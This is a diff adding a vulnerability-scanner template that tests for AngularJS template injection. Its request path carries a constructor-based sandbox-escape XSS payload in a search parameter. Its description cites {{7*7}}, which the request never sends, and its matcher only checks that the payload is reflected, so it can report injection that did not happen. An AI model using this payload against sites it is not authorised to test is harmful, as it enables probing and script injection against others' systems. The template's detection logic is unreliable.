@@ -1,0 +1,16 @@
+id: K70n0s510-xss-angular
+info:
+  name: AngularJS Template Injection (CSTI)
+  author: K70n0s510
+  severity: high
+  description: Detects XSS via AngularJS template engine evaluation {{7*7}}.
+  tags: xss,angular,csti
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?search={{constructor.constructor('alert(1337)')()}}"]
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["alert(1337)"]
+      - type: status
+        status: [200]
